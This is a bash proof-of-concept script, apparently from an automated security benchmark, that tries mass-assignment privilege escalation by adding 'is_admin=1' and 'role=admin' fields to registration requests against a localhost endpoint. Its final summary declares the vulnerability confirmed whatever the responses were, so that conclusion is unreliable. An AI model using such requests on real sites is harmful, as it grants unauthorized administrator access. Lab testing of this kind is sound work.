#!/bin/bash
# POC: Demonstrates mass assignment privilege escalation in registration endpoint by adding is_admin parameter to register as administrator
# Target: ./repo
# Created: 2025-12-01T16:03:49.451Z
# Session: benchmark-XBEN-069-24-minbd4jr

# Mass Assignment Privilege Escalation POC - Registration Endpoint
# This script demonstrates the ability to register with elevated privileges
# by injecting the is_admin parameter during account creation

TARGET_URL="http://localhost:8080/api/register.php"
TIMESTAMP=$(date +%s)
TEST_USER="massassign_${TIMESTAMP}"
TEST_EMAIL="massassign_${TIMESTAMP}@test.com"
TEST_PASS="TestPassword123"

echo "[*] Mass Assignment Privilege Escalation POC - Registration"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Register with is_admin=1 parameter
echo "[TEST 1] Registering user with is_admin=1 parameter..."
echo "Request: curl -X POST $TARGET_URL -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=${TEST_USER}&password=${TEST_PASS}&email=${TEST_EMAIL}&is_admin=1'"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=${TEST_USER}&password=${TEST_PASS}&email=${TEST_EMAIL}&is_admin=1")

echo "[RESPONSE] $RESPONSE"
echo ""

# Check if registration was successful
if echo "$RESPONSE" | grep -q "success.*true"; then
    echo "[✓] Registration accepted is_admin parameter"
    echo "[!] User registered with potentially elevated privileges"
    REGISTERED_USER="$TEST_USER"
else
    echo "[✗] Registration failed or rejected is_admin parameter"
fi

echo ""

# Test 2: Register with role=admin parameter
TIMESTAMP2=$(date +%s)
TEST_USER2="roleadmin_${TIMESTAMP2}"
TEST_EMAIL2="roleadmin_${TIMESTAMP2}@test.com"

echo "[TEST 2] Registering user with role=admin parameter..."
echo "Request: curl -X POST $TARGET_URL -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=${TEST_USER2}&password=${TEST_PASS}&email=${TEST_EMAIL2}&role=admin'"
echo ""

RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "username=${TEST_USER2}&password=${TEST_PASS}&email=${TEST_EMAIL2}&role=admin")

echo "[RESPONSE] $RESPONSE2"
echo ""

if echo "$RESPONSE2" | grep -q "success.*true"; then
    echo "[✓] Registration accepted role parameter with admin value"
    echo "[!] User registered with potentially elevated privileges"
fi

echo ""
echo "[SUMMARY]"
echo "The registration endpoint accepted arbitrary privilege escalation parameters"
echo "This indicates a mass assignment vulnerability in the registration process"
echo ""